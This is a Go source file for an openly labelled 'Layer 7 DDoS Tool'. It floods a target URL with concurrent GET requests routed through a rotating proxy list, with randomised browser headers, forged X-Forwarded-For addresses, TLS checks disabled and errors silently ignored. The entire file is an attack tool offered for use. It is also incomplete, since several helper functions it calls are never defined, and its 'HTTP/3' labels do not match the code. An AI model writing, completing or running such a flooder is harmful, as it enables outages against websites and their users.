package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

// Constants and configurations
const (
	banner = `    _____  __         _      
   / ___/ / /_ _____ (_)_  __
   \__ \ / __// ___// /| |/_/
  ___/ // /_ / /   / /_>  <  
 /____/ \__//_/   /_//_/|_|  
                            v3.0`

	usage = `Usage: go run main.go <target> <time> <rate> <threads> <proxy-file>`
)

type Config struct {
	Target    string
	Time      int
	Rate      int
	Threads   int
	ProxyFile string
}

func main() {
	// Parse command line arguments
	if len(os.Args) < 6 {
		fmt.Println(usage)
		os.Exit(1)
	}

	config := &Config{
		Target:    os.Args[1],
		Time:      parseInt(os.Args[2]),
		Rate:      parseInt(os.Args[3]),
		Threads:   parseInt(os.Args[4]),
		ProxyFile: os.Args[5],
	}

	// Display banner and info
	printBanner(config)

	// Load proxies
	proxies := loadProxies(config.ProxyFile)
	if len(proxies) == 0 {
		fmt.Println("Error: No proxies loaded")
		os.Exit(1)
	}

	// Start attack
	var wg sync.WaitGroup
	for i := 1; i <= config.Threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer wg.Done()
			workerThread(threadID, config, proxies)
		}(i)
	}

	// Wait for duration
	time.Sleep(time.Duration(config.Time) * time.Second)
	fmt.Printf("\n[HTTP/3] (%s) Attack Completed\n", getCurrentTime())
}

func workerThread(id int, config *Config, proxies []string) {
	fmt.Printf("[HTTP/3] (%s) Worker Thread %d Started\n", getCurrentTime(), id)

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
			Proxy: func(_ *http.Request) (*url.URL, error) {
				proxy := proxies[rand.Intn(len(proxies))]
				return url.Parse("http://" + proxy)
			},
		},
		Timeout: 10 * time.Second,
	}

	targetURL, err := url.Parse(config.Target)
	if err != nil {
		fmt.Printf("Error parsing target URL: %v\n", err)
		return
	}

	// Attack loop
	for {
		for i := 0; i < config.Rate; i++ {
			go func() {
				req := buildRequest(targetURL)
				_, err := client.Do(req)
				if err != nil {
					// Silently ignore errors
					return
				}
			}()
		}
		time.Sleep(time.Second)
	}
}

func buildRequest(targetURL *url.URL) *http.Request {
	req, _ := http.NewRequest("GET", targetURL.String(), nil)

	// Add headers similar to the original script
	req.Header.Set("User-Agent", getRandomUserAgent())
	req.Header.Set("Accept", getRandomAccept())
	req.Header.Set("Accept-Language", getRandomLanguage())
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("X-Forwarded-For", generateIP())
	req.Header.Set("Origin", targetURL.Scheme+"://"+targetURL.Host)

	return req
}

// Helper functions
func getCurrentTime() string {
	return time.Now().Format("15:04:05")
}

func parseInt(s string) int {
	val := 0
	fmt.Sscanf(s, "%d", &val)
	return val
}

func loadProxies(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("Error opening proxy file: %v\n", err)
		return nil
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		if proxy != "" {
			proxies = append(proxies, proxy)
		}
	}
	return proxies
}

func printBanner(config *Config) {
	fmt.Println(banner)
	fmt.Println("-------------------------------------------")
	fmt.Printf("-> Target \t: %s\n", config.Target)
	fmt.Printf("-> Time \t: %d seconds\n", config.Time)
	fmt.Printf("-> Rate \t: %d\n", config.Rate)
	fmt.Printf("-> Thread \t: %d\n", config.Threads)
	fmt.Printf("-> ProxyFile\t: %s\n", config.ProxyFile)
	fmt.Println("-------------------------------------------")
	fmt.Println("-> xxx Layer 7 DDoS Tool xxx")
	fmt.Println("-------------------------------------------")
	fmt.Println()
}
